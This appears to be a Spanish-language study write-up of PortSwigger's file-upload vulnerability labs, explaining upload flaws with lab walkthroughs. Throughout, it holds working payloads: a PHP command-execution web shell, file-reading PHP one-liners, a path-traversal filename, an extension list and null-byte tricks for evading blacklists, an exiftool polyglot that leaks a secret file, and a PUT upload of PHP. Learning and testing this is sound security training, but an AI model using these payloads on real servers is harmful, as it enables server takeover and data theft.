# 📁 Port Swigger

https://portswigger.net/web-security/learning-paths/file-upload-vulnerabilities

## ¿Que son las vulnerabilidades de subida de archivos?

_Estas son caundo el servidor permite la subida de archivos al servidor sin las validaciones suficientes, tanto en tamaño, contenido o nombre._

## ¿Cual es el impacto de esta vulnerabilidad?

_Para determinar el impacto de esto nos podemos basar en dos cosas:_

1. Qué aspecto del archivo el sitio web no valida correctamente, ya sea su tamaño, tipo, contenido, etc.
2. Qué restricciones se imponen en el expediente una vez que se haya subido con éxito. _En el peor de los casos, el tipo del archivo no se valida correctamente, y la configuración del servidor permite ejecutar ciertos tipos de archivos (como .php y .jsp) en forma de código. En este caso, un atacante podría potencialmente subir un archivo de código del lado del servidor que funciona como una shell web, concediéndoles efectivamente el control total sobre el servidor._

_Si el nombre de archivo no se valida correctamente, esto podría permitir a un atacante sobrescribir archivos críticos simplemente cargando un archivo con el mismo nombre. Si el servidor también es vulnerable a la traversal de directorios, esto podría significar que los atacantes pueden incluso subir archivos a lugares no previstos._

## Como maneja una WEB los archivos estáticos

_Lo que suceda a continuación depende del tipo de archivo y de la configuración del servidor._

* _Si este tipo de archivo no es ejecutable, como una imagen o una página HTML estática, el servidor puede simplemente enviar el contenido del archivo al cliente en una respuesta HTTP._
* _Si el tipo de archivo es ejecutable, como un archivo PHP, **y** el servidor está configurado para ejecutar archivos de este tipo, asignará variables basadas en las cabeceras y parámetros en la solicitud HTTP antes de ejecutar el script. La salida resultante puede ser enviada al cliente en una respuesta HTTP._
* _Si el tipo de archivo es ejecutable, pero el servidor **no está** configurado para ejecutar archivos de este tipo, generalmente responderá con un error. Sin embargo, en algunos casos, el contenido del archivo todavía puede ser servido al cliente como texto plano. Tales configuraciones erróneas pueden ser explotadas ocasionalmente para filtrar código fuente y otra información sensible. Puedes ver un ejemplo de esto en nuestros materiales de aprendizaje de información._ _El `Content-Type`La cabecera de respuesta puede proporcionar pistas sobre qué tipo de archivo cree que el servidor ha servido. Si esta cabecera no ha sido establecida explícitamente por el código de aplicación, normalmente contiene el resultado de la asignación de tipo de archivo/MIME._

## Subidas de archivos sin restricciones para desplegar una shell web

_Desde una perspectiva de seguridad, el peor escenario posible es cuando un sitio web le permite subir scripts del lado del servidor, como archivos PHP, Java o Python, y también está configurado para ejecutarlos como código. Esto hace que sea trivial crear su propia shell web en el servidor._

_El siguiente PHP de una línea podría usarse para leer archivos arbitrarios del sistema de archivos del servidor:_

```php
<?php echo file_get_contents('/path/to/target/file'); ?>
```

_WebShell_

```php
<?php echo system($_GET['command']); ?>
```

_Este script le permite pasar un comando de sistema arbitrario a través de un parámetro de consulta de la siguiente manera:_

```http
GET /example/exploit.php?command=id HTTP/1.1
```

#### EJEMPLO PRÁCTICO

<figure><img src="../.gitbook/assets/imagen (85).png" alt=""><figcaption></figcaption></figure>

_Ponemos nuestro archivo con la extensión php..._&#x20;

<figure><img src="../.gitbook/assets/imagen (86).png" alt=""><figcaption></figcaption></figure>

_Cargamos la imagen_

<figure><img src="../.gitbook/assets/imagen (87).png" alt=""><figcaption></figcaption></figure>

_Abrimos imagen... Y podemos ver el resultado del script php_

## Explotar validaciones defectuosas

_Al enviar formularios HTML, el navegador normalmente envía los datos proporcionados en un `POST`solicitud con el tipo de contenido `application/x-www-form-url-encoded`. Esto está bien para enviar texto simple como su nombre o dirección. Sin embargo, no es adecuado para enviar grandes cantidades de datos binarios, como un archivo de imagen completo o un documento PDF. En este caso, el tipo de contenido `multipart/form-data`es preferible._

_Un formulario el cual permite subir imagen y algunos campos más se ve así..._

```ruby
POST /images HTTP/1.1
    Host: normal-website.com
    Content-Length: 12345
    Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="image"; filename="example.jpg"
    Content-Type: image/jpeg

    [...binary content of example.jpg...]

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="description"

    This is an interesting description of my image.

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="username"

    wiener
    ---------------------------012345678901234567890123456--
```

_Como puedes ver, el cuerpo del mensaje se divide en partes separadas para cada entrada del formulario. Cada parte contiene un `Content-Disposition`cabecera, que proporciona información básica sobre el campo de entrada al que se refiere. Estas partes individuales también pueden contener su propia `Content-Type`cabecera, que le dice al servidor el tipo MIME de los datos que se presentaron usando esta entrada._

_Una forma en que los sitios web pueden intentar validar las subidas de archivos es comprobar que esta entrada específica `Content-Type`cabecera coincide con un tipo de MIME esperado. Si el servidor sólo espera archivos de imagen, por ejemplo, sólo puede permitir tipos como `image/jpeg`y `image/png`. Los problemas pueden surgir cuando el servidor confía implícitamente el valor de esta cabecera. Si no se realiza ninguna validación adicional para comprobar si el contenido del archivo realmente coincide con el supuesto tipo MIME, esta defensa se puede eludir fácilmente utilizando herramientas como Burp Repeater._

#### EJEMPLO PRÁCTICO

<figure><img src="../.gitbook/assets/imagen (88).png" alt=""><figcaption></figcaption></figure>

_Volvemos a tener este formulario... Vamos a probar a inyectar un archivo php._

<figure><img src="../.gitbook/assets/imagen (89).png" alt=""><figcaption></figcaption></figure>

_Ahora vamos a cambiar el `Content-Type` para poder subir la imagen._

<figure><img src="../.gitbook/assets/imagen (90).png" alt=""><figcaption></figcaption></figure>

&#x20;_Ahora hemos subido la imagen de forma correcta._

<figure><img src="../.gitbook/assets/imagen (91).png" alt=""><figcaption></figcaption></figure>

_Si hacemos click podremos ver el resultado de script que hemos inyectado._

## Ejecución de archivos en directorios accesibles al usuario

```http
GET /static/exploit.php?command=id HTTP/1.1
    Host: normal-website.com


    HTTP/1.1 200 OK
    Content-Type: text/plain
    Content-Length: 39

    <?php echo system($_GET['command']); ?>
```

#### EJEMPLO PRÁCTICO

<figure><img src="../.gitbook/assets/imagen (92).png" alt=""><figcaption></figcaption></figure>

_Tenemos una entrada para poder insertar una imagen._&#x20;

<figure><img src="../.gitbook/assets/imagen (100).png" alt=""><figcaption></figcaption></figure>

_Ahora la subimos haciendo este Path Traversal: `%2f%2e%2e%2fshell.php`_

<figure><img src="../.gitbook/assets/imagen (95).png" alt=""><figcaption></figcaption></figure>

## Blacklist pobre a la hora de subir archivos

_Las webs sueles aplicar una blacklist a la hora de los archivos que se pueden subir por lo tanto hay ciertas extensiones que no se pueden utilizar pero podemos atentar contra estas blacklists..._

#### EJEMPLO PRÁCTICO

<figure><img src="../.gitbook/assets/imagen (101).png" alt=""><figcaption></figcaption></figure>

&#x20;_Tenemos una entrada para la subida de archivos en este caso una imagen..._

<figure><img src="../.gitbook/assets/imagen (102).png" alt=""><figcaption></figcaption></figure>

_Probamos con este PHP pero nos devuelve que no podemos._

<figure><img src="../.gitbook/assets/imagen (103).png" alt=""><figcaption></figcaption></figure>

_Nos dirijimos al Intruder y agregamos las llaves aquí..._

<figure><img src="../.gitbook/assets/imagen (104).png" alt=""><figcaption></figcaption></figure>

```php
php
php2
php3
php4
php5
php6
php7
phps
phps
pht
phtm
phtml
pgif
shtml
htaccess
phar
inc
hphp
ctp
module
```

_Agregamos este Payload_

<figure><img src="../.gitbook/assets/imagen (105).png" alt=""><figcaption></figcaption></figure>

_Ahora una vez con todos los archivos subidos volvemos ha hacer el ataque pero con un comando y analizamos las respuestas..._

## Ofuscando extensiones de archivos

_Técnicas para hacer bypass a las BlackLists_

* _`exploit.php.jpg`_
* _`exploit.php.`_
* _`exploit%2Ephp`_
* _Null byte:\`\`exploit.asp;.jpg or exploit.asp%00.jpg, exploit.php%00.jpg\`_
* _Unicode characters\`\`\`xC0 x2E`,` xC4 xAE`or`xC0 xAE x2E\`\`_
* `exploit.p.phphp`

#### EJEMPLO PRÁCTICO

<figure><img src="../.gitbook/assets/imagen (96).png" alt=""><figcaption></figcaption></figure>

_Identificamos un capo para subir un archivo en este caso png/jpg_

<figure><img src="../.gitbook/assets/imagen (99).png" alt=""><figcaption></figcaption></figure>

_Ahora subimos el archivo aplicando un null byte._

## Validación del contenido del archivo

_Los servidores más seguros tratan de comprobar realmente el contenido del archivo para asegurarse de que realmente coincide con lo que está esperando el servidor._

_En el caso de una función de carga de imagen, el servidor podría tratar de verificar ciertas propiedades intrínsecas de una imagen, como sus dimensiones. Si intentas subir un script PHP, por ejemplo, no tendrá ninguna dimensión. Por lo tanto, el servidor puede deducir que no puede ser una imagen, y rechazar la carga en consecuencia._

_También pueden verificar los Magic numbers para comprobar realmente el archivo que es._

<figure><img src="../.gitbook/assets/imagen (108).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/imagen (109).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/imagen (110).png" alt=""><figcaption></figcaption></figure>

**EXIFTOOL METHOD**

```
wget https://i.pinimg.com/736x/99/f9/85/99f9858700cae99dd18ce3ccefe502ab.jpg
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" ./99f9858700cae99dd18ce3ccefe502ab.jpg -o polyglot.php
python3 -m http.server 80
```

#### EJEMPLO PRÁCTICO

```r
wget https://i.pinimg.com/736x/99/f9/85/99f9858700cae99dd18ce3ccefe502ab.jpg
```

_Nos descargamos una imagen_

```r
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" ./99f9858700cae99dd18ce3ccefe502ab.jpg -o polyglot.php
```

_La convertimos en una "imagen"_

<figure><img src="../.gitbook/assets/imagen (107).png" alt=""><figcaption></figcaption></figure>

_La subimos_&#x20;

<figure><img src="../.gitbook/assets/imagen (106).png" alt=""><figcaption></figcaption></figure>

_Vemos que ha funcionado correctamente_

## Otro nivel de seguridad

_En algunos casos puede a ver un nivel de seguridad extra:_

* Se alojan en destinos temporales
* Se verifica su contenido
* Se altera el nombre del archivo
* Sel altera la ruta del mismo

_En otros casos el servidor puede tener dentro un sofware de antivirus el cual puede examninar el archivo, este escaneo dura milisegundos pero ya son milisegundos que el archivo se mantiene dentro del sistema._

## Subida de archivos basadas en URL

_Condiciones de carrera similares pueden ocurrir en funciones que le permiten subir un archivo proporcionando una URL. En este caso, el servidor tiene que buscar el archivo a través de Internet y crear una copia local antes de que pueda realizar cualquier validación._

_Como el archivo se carga usando HTTP, los desarrolladores no pueden utilizar los mecanismos incorporados de su marco para validar archivos de forma segura. En su lugar, pueden crear manualmente sus propios procesos para almacenar temporalmente y validar el archivo, lo que puede no ser tan seguro._

_Por ejemplo, si el archivo se carga en un directorio temporal con un nombre aleatorizado, en teoría, debería ser imposible para un atacante explotar cualquier condición de raza. Si no conocen el nombre del directorio, no podrán solicitar el archivo para activar su ejecución. Por otro lado, si el nombre de directorio aleatorizado se genera usando funciones pseudo-aleladas como PHP `uniqid()`, potencialmente puede ser forzado por el bruto._

_Para hacer ataques como este más fácil, puede tratar de ampliar la cantidad de tiempo que se tarda en procesar el archivo, alargando así la ventana para forzar el nombre del directorio. Una forma de hacer esto es subiendo un archivo más grande. Si se procesa en trozos, puede potencialmente aprovecharse de esto creando un archivo malicioso con la carga útil al principio, seguido de un gran número de acolchados arbitrarios bytes._

## Explotar vulnerabilidades de carga de archivos sin la ejecución de código remoto

_En los ejemplos que hemos visto hasta ahora, hemos sido capaces de subir scripts del lado del servidor para la ejecución de código remoto. Esta es la consecuencia más grave de una función de carga de archivos inseguras, pero estas vulnerabilidades todavía pueden ser explotadas de otras maneras._

_Aunque es posible que no sea capaz de ejecutar scripts en el servidor, es posible que todavía pueda subir scripts para ataques del lado del cliente. Por ejemplo, si puede cargar archivos HTML o imágenes SVG, puede utilizar potencialmente `<script>`etiquetas para crear cargas XSS almacenadas._

_Si el archivo cargado aparece en una página que es visitada por otros usuarios, su navegador ejecutará el script cuando trate de renderizar la página. Tenga en cuenta que debido a restricciones de la política del mismo origen, este tipo de ataques sólo funcionarán si el archivo subido se sirve desde el mismo origen al que lo sube._

## Explotar vulnerabilidades en el análisis de archivos subidos

_Si el archivo cargado parece estar almacenado y servido de forma segura, el último recurso es tratar de explotar vulnerabilidades específicas para el análisis o procesamiento de diferentes formatos de archivo. Por ejemplo, usted sabe que el servidor analiza archivos basados en XML, como Microsoft Office `.doc`o o `.xls`archivos, esto puede ser un vector potencial para ataques de inyección XXE._

## Subir archivos usando PUT

_Vale la pena señalar que algunos servidores web pueden ser configurados para soportar `PUT`peticiones. Si las defensas adecuadas no están en su lugar, esto puede proporcionar un medio alternativo de cargar archivos maliciosos, incluso cuando una función de carga no está disponible a través de la interfaz web._

```http
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?>
```
